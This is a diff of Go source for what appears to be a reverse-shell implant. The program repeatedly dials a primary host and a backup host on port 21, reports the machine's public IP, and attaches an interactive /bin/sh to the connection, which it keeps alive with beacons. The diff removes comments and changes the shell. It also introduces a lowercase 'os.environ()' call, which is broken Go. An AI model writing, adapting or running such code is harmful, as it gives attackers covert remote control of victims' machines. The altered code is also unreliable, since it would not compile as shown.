@@ -19,7 +19,6 @@ const (
 	BackupHost  = "linux-x86-tcpudp.strangled.net:21"
 )
 
-// IPInfo matches the structure of the ipinfo.io JSON response
 type IPInfo struct {
 	IP string `json:"ip"`
 }
@@ -31,19 +30,16 @@ func checkAndAcquireLock() {
 			var oldPID int
 			_, err := fmt.Sscanf(string(data), "%d", &oldPID)
 			if err == nil {
-				// Check if process is actively running
 				process, err := os.FindProcess(oldPID)
 				if err == nil {
 					err = process.Signal(syscall.Signal(0))
 					if err == nil {
-						// Process is already running, exit cleanly
 						os.Exit(0)
 					}
 				}
 			}
 		}
 	}
-	// Write current PID to lockfile
 	_ = os.WriteFile(LockFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
 }
 
@@ -76,13 +72,11 @@ func getPublicIP() string {
 }
 
 func handleShellSession(conn net.Conn) {
-	// Allocate a native interactive shell broker process
-	cmd := exec.Command("/bin/bash", "-i")
+	// THE UNIVERSAL FIX: Swapped out /bin/bash for /bin/sh since bash is missing
+	cmd := exec.Command("/bin/sh")
 	
-	// Force an unbuffered interactive terminal environment profile
-	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")
+	cmd.Env = append(os.environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")
 
-	// Create structural pseudo-terminal pipes to link the socket natively
 	stdinPipe, _ := cmd.StdinPipe()
 	stdoutPipe, _ := cmd.StdoutPipe()
 	stderrPipe, _ := cmd.StderrPipe()
@@ -91,28 +85,23 @@ func handleShellSession(conn net.Conn) {
 		return
 	}
 
-	// Channel to signal process termination
 	done := make(chan bool, 3)
 
-	// Async Routine 1: Read inputs from your Dashboard UI and feed them straight into Bash stdin
 	go func() {
 		_, _ = io.Copy(stdinPipe, conn)
 		done <- true
 	}()
 
-	// Async Routine 2: Capture stdout from Bash and stream it straight back to your Dashboard UI
 	go func() {
 		_, _ = io.Copy(conn, stdoutPipe)
 		done <- true
 	}()
 
-	// Async Routine 3: Capture stderr from Bash and stream it straight back to your Dashboard UI
 	go func() {
 		_, _ = io.Copy(conn, stderrPipe)
 		done <- true
 	}()
 
-	// Asynchronous Keepalive Beacon: Sends the quiet \x00 character every 5 seconds to prevent drops
 	go func() {
 		ticker := time.NewTicker(5 * time.Second)
 		defer ticker.Stop()
@@ -130,7 +119,6 @@ func handleShellSession(conn net.Conn) {
 		}
 	}()
 
-	// Block thread here until any copy pipe drops or the bash session exits natively
 	<-done
 	_ = cmd.Process.Kill()
 }
@@ -139,7 +127,6 @@ func main() {
 	checkAndAcquireLock()
 	defer removeLock()
 
-	// Handle standard kill signals to ensure lock file cleanup
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -148,32 +135,25 @@ func main() {
 		os.Exit(0)
 	}()
 
-	// Fetch public network metadata target address identity signature
 	trueIP := getPublicIP()
 
-	// Persistent, infinite resilience network wheel
 	for {
 		var conn net.Conn
 		var err error
 
-		// 1. Attempt connection to primary master destination target
 		conn, err = net.DialTimeout("tcp", PrimaryHost, 3*time.Second)
 		if err != nil {
-			// 2. FALLBACK RETRY: Route through backup port 21 relay proxy if primary fails
 			conn, err = net.DialTimeout("tcp", BackupHost, 3*time.Second)
 		}
 
 		if err == nil && conn != nil {
-			// Blast your mandatory layout handshake validation IP string followed by newline (\n)
 			_, err = conn.Write([]byte(trueIP + "\n"))
 			if err == nil {
-				// Launch full interactive dual-duplex stream loop brokerage session
 				handleShellSession(conn)
 			}
 			_ = conn.Close()
 		}
 
-		// Sleep for 5 seconds before executing the recovery wheel cycle to protect CPU overhead
 		time.Sleep(5 * time.Second)
 	}
 }
